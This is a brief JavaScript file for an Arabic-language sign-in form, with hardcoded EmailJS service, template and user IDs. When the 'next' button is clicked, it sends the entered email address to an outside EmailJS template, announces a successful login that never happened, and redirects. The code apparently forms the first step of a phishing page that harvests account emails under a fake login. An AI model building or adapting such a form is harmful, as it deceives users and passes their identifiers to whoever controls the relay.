
const emailjsConfig = {
  serviceID: 'service_f71bc2o',
  templateID: 'template_hofeijl',
  userID: 'ZqKuiZff4aqnGnsJs',
};

const form = document.getElementById('text');
const nextBtn = document.getElementById('next-btn');

nextBtn.addEventListener('click', function (event) {
  event.preventDefault();

  const email = form.querySelector('input[type="text"]').value;

  // Check if email contains "@"
  if (!email.includes('@')) {
    alert('حدث خطأ أثناء تسجيل الدخول! يجب أن يحتوي البريد الإلكتروني على علامة "@"');
    return;
  }

  // Send the message to email.js
  emailjs.send(emailjsConfig.serviceID, emailjsConfig.templateID, { to_email: email }, emailjsConfig.userID)
  .then(function (response) {
    // Success
    alert('تم تسجيل الدخول بنجاح!');
    window.location.href = "index.html";
  }, function (error) {
    // Error
    alert('حدث خطأ أثناء تسجيل الدخول!');
  });
});


